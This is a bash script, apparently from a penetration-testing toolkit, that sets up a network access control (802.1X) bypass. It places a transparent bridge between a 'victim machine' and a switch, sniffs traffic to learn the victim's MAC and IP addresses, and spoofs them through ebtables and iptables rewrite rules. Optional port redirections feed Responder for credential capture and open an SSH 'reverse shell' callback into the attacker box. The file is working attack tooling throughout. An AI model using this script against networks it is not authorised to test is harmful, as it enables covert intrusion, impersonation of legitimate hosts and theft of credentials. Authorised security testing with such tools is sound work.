#!/bin/bash

# -----
# Name: nac_bypass_setup.sh
# scip AG - Michael Schneider
# -----
# Original Script:
# Matt E - NACkered v2.92.2 - KPMG LLP 2014
# KPMG UK Cyber Defence Services
# -----

## Variables
VERSION="0.6.5-1715949302"

CMD_ARPTABLES=/usr/sbin/arptables
CMD_EBTABLES=/usr/sbin/ebtables
CMD_IPTABLES=/usr/sbin/iptables

## Text color variables - saves retyping these awful ANSI codes
TXTRST="\e[0m" # Text reset
SUCC="\e[1;32m" # green
INFO="\e[1;34m" # blue
WARN="\e[1;31m" # red
INP="\e[1;36m" # cyan

BRINT=br0 # bridge interface
SWINT=eth0 # network interface plugged into switch
SWMAC=00:11:22:33:44:55 # initial value, is set during initialisation
COMPINT=eth1 # network interface plugged into victim machine

BRIP=169.254.66.66 # IP address for the bridge
BRGW=169.254.66.1 # Gateway IP address for the bridge

TEMP_FILE=/tmp/tcpdump.pcap
OPTION_RESPONDER=0
OPTION_SSH=0
OPTION_AUTONOMOUS=0
OPTION_CONNECTION_SETUP_ONLY=0
OPTION_INITIAL_SETUP_ONLY=0
OPTION_RESET=0

## Ports for tcpdump
TCPDUMP_PORT_1=88
TCPDUMP_PORT_2=445

## Ports for Responder
PORT_UDP_NETBIOS_NS=137
PORT_UDP_NETBIOS_DS=138
PORT_UDP_DNS=53
PORT_UDP_LDAP=389
PORT_TCP_LDAP=389
PORT_TCP_SQL=1433
PORT_UDP_SQL=1434
PORT_TCP_HTTP=80
PORT_TCP_HTTPS=443
PORT_TCP_SMB=445
PORT_TCP_NETBIOS_SS=139
PORT_TCP_FTP=21
PORT_TCP_SMTP1=25
PORT_TCP_SMTP2=587
PORT_TCP_POP3=110
PORT_TCP_IMAP=143
PORT_TCP_PROXY=3128
PORT_UDP_MULTICAST=5553

DPORT_SSH=50222 #SSH call back port use victimip:50022 to connect to attackerbox:sshport
PORT_SSH=50022
RANGE=61000-62000 #Ports for my traffic on NAT

## display usage hints
Usage() {
  echo -e "$0 v$VERSION usage:"
  echo "    -1 <eth>    network interface plugged into switch"
  echo "    -2 <eth>    network interface plugged into victim machine"
  echo "    -a          autonomous mode"
  echo "    -c          start connection setup only"
  echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
  echo "    -h          display this help"
  echo "    -i          start initial setup only"
  echo "    -r          reset all settings"
  echo "    -R          enable port redirection for Responder"
  echo "    -S          enable port redirection for OpenSSH and start the service"
  exit 0
}

## display version info
Version() {
  echo -e "$0 v$VERSION"
  exit 0
}

## Check if we got all needed parameters
CheckParams() {
  while getopts ":1:2:acg:hirRS" opts
    do
      case "$opts" in
        "1")
          SWINT=$OPTARG
          ;;
        "2")
          COMPINT=$OPTARG
          ;;
        "a")
          OPTION_AUTONOMOUS=1
          ;;
        "c")
          OPTION_CONNECTION_SETUP_ONLY=1
          ;;
        "g")
          GWMAC=$OPTARG
          ;;
        "h")
          Usage
          ;;
        "i")
          OPTION_INITIAL_SETUP_ONLY=1
          ;;
        "r")
          OPTION_RESET=1
          ;;
        "R")
          OPTION_RESPONDER=1
          ;;
        "S")
          OPTION_SSH=1
          ;;
        *)
          OPTION_RESPONDER=0
          OPTION_SSH=0
          OPTION_AUTONOMOUS=0
          ;;
      esac
  done
}

InitialSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting NAC bypass! Stay tuned...$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Doing some ground work$TXTRST"
        echo
    fi

    systemctl stop NetworkManager.service
    cp /etc/sysctl.conf /etc/sysctl.conf.bak
    echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
    sysctl -p
    echo "" > /etc/resolv.conf

    # Turn off multicast to prevent initial IGMP messages
    ip link set $SWINT multicast off
    ip link set $COMPINT multicast off
    
    # Stop NTP services
    declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
    for NTP_SERVICE in "${NTP_SERVICES[@]}"
    do
        NTP_SERVICE_STATUS=$(systemctl is-active $NTP_SERVICE)
        if [ $NTP_SERVICE_STATUS == "active" ]; then
            systemctl stop $NTP_SERVICE
        fi
    done
    timedatectl set-ntp false

    # get SWINT MAC address automatically
    SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Ground work done.$TXTRST"
        echo
    fi

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Starting bridge configuration$TXTRST"
        echo
    fi

    brctl addbr $BRINT # create bridge
    brctl addif $BRINT $COMPINT # add computer side to bridge
    brctl addif $BRINT $SWINT # add switch side to bridge

    echo 8 > /sys/class/net/br0/bridge/group_fwd_mask # forward EAP packets
    echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

    ifconfig $COMPINT 0.0.0.0 up promisc # bring up comp interface
    ifconfig $SWINT 0.0.0.0 up promisc # bring up switch interface

    macchanger -m 00:12:34:56:78:90 $BRINT # Swap MAC of bridge to an initialisation value
    macchanger -m $SWMAC $BRINT # Swap MAC of bridge to the switch side MAC

    ## Bringing up the Bridge
    ifconfig $BRINT 0.0.0.0 up promisc

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] Bridge up, should be dark.$TXTRST"
        echo
        echo -e "$INP [ # ] Connect Ethernet cables to adatapers...$TXTRST"
        echo -e "$INP [ # ] Wait for 30 seconds then press any key...$TXTRST"
        echo -e "$WARN [ ! ] Victim machine should work at this point - if not, bad times are coming - run!!$TXTRST"
        read -p " " -n1 -s
        echo
    else
        sleep 25s
    fi
}

ConnectionSetup() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting connection$TXTRST"
        echo
    fi

    ethtool -r $COMPINT
    ethtool -r $SWINT

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Listening for TCP traffic...$TXTRST"
        echo
    fi

    ## PCAP and look for SYN packets coming from the victim PC to get the source IP, source mac, and gateway MAC
    # TODO: Replace this with tcp SYN OR (udp && not broadcast? need to tell whos source and whos dest)
    # TODO: Replace with actually pulling from the source interface?
    tcpdump -i $COMPINT -s0 -w $TEMP_FILE -c1 'tcp[13] & 2 != 0'

    COMPMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
    if [ -z "$GWMAC" ]; then
        GWMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
    fi
    COMIP=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Processing packet and setting variables $TXTRST"
        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
        echo
    fi

    ## Going Silent
    $CMD_ARPTABLES -A OUTPUT -o $SWINT -j DROP
    $CMD_ARPTABLES -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -A OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -A OUTPUT -o $SWINT -j DROP

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Bringing up interface with bridge side IP address, setting up Layer 2 rewrite and default route. $TXTRST"
        echo
    fi
    ifconfig $BRINT $BRIP up promisc

    ## Setting up Layer 2 rewrite
    ## If script was called with -c, we need to find the MAC of the interface towards the switch.
    if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
        SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'`
    fi
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
    $CMD_EBTABLES -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

    ## Create default routes so we can route traffic - all traffic goes to the bridge gateway and this traffic gets Layer 2 sent to GWMAC
    arp -s -i $BRINT $BRGW $GWMAC
    route add default gw $BRGW dev $BRINT metric 10

    ## SSH CALLBACK if we receive inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
    if [ "$OPTION_SSH" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up SSH reverse shell inbound on $COMIP:$DPORT_SSH and start OpenSSH daemon $TXTRST"
            echo
        fi
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT_SSH -j DNAT --to $BRIP:$PORT_SSH
    fi

    if [ "$OPTION_RESPONDER" -eq 1 ]; then

        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
            echo
            echo -e "$INFO [ * ] Setting up all inbound ports for Responder $TXTRST"
            echo
        fi

        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_NS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_NS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_NETBIOS_DS -j DNAT --to $BRIP:$PORT_UDP_NETBIOS_DS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_DNS -j DNAT --to $BRIP:$PORT_UDP_DNS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_LDAP -j DNAT --to $BRIP:$PORT_UDP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_LDAP -j DNAT --to $BRIP:$PORT_TCP_LDAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SQL -j DNAT --to $BRIP:$PORT_TCP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_SQL -j DNAT --to $BRIP:$PORT_UDP_SQL
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTP -j DNAT --to $BRIP:$PORT_TCP_HTTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_HTTPS -j DNAT --to $BRIP:$PORT_TCP_HTTPS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMB -j DNAT --to $BRIP:$PORT_TCP_SMB
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_NETBIOS_SS -j DNAT --to $BRIP:$PORT_TCP_NETBIOS_SS
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_FTP -j DNAT --to $BRIP:$PORT_TCP_FTP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP1 -j DNAT --to $BRIP:$PORT_TCP_SMTP1
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_SMTP2 -j DNAT --to $BRIP:$PORT_TCP_SMTP2
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_POP3 -j DNAT --to $BRIP:$PORT_TCP_POP3
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_IMAP -j DNAT --to $BRIP:$PORT_TCP_IMAP
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $PORT_TCP_PROXY -j DNAT --to $BRIP:$PORT_TCP_PROXY
        $CMD_IPTABLES -t nat -A PREROUTING -i br0 -d $COMIP -p udp --dport $PORT_UDP_MULTICAST -j DNAT --to $BRIP:$PORT_UDP_MULTICAST
    fi

    # Setting up Layer 3 rewrite rules
    # Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
    $CMD_IPTABLES -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

    ## START SSH
    if [ "$OPTION_SSH" -eq 1 ]; then
        systemctl start ssh.service
    fi

    ## Finish
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All setup steps complete; check ports are still lit and operational $TXTRST"
        echo
    fi

    ## Re-enabling traffic flow; monitor ports for lockout
    $CMD_ARPTABLES -D OUTPUT -o $SWINT -j DROP
    $CMD_ARPTABLES -D OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -D OUTPUT -o $COMPINT -j DROP
    $CMD_IPTABLES -D OUTPUT -o $SWINT -j DROP

    ## Housecleaning
    rm $TEMP_FILE

    ## All done!
    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INP [ * ] Time for fun & profit $TXTRST"
        echo
    fi
}

Reset() {

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$INFO [ * ] Resetting all settings $TXTRST"
        echo
    fi

    ## Bringing bridge down
    ifconfig $BRINT down
    brctl delbr $BRINT

    ## Delete default route
    arp -d -i $BRINT $BRGW $GWMAC
    route del default dev $BRINT

    # Flush EB, ARP- and IPTABLES
    $CMD_EBTABLES -F
    $CMD_EBTABLES -F -t nat
    $CMD_ARPTABLES -F
    $CMD_IPTABLES -F
    $CMD_IPTABLES -F -t nat

    # Restore sysctl.conf
    cp /etc/sysctl.conf.bak /etc/sysctl.conf
    rm /etc/sysctl.conf.bak
    sysctl -p

    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
        echo
        echo -e "$SUCC [ + ] All reset steps are completed. $TXTRST"
        echo
    fi
}

## Main
CheckParams $@

if [ "$OPTION_RESET" -eq 1 ]; then
    Reset
    exit 0
fi

if [ "$OPTION_INITIAL_SETUP_ONLY" -eq 1 ]; then
    InitialSetup
    exit 0
fi

if [ "$OPTION_CONNECTION_SETUP_ONLY" -eq 1 ]; then
    ConnectionSetup
    exit 0
fi

InitialSetup
ConnectionSetup
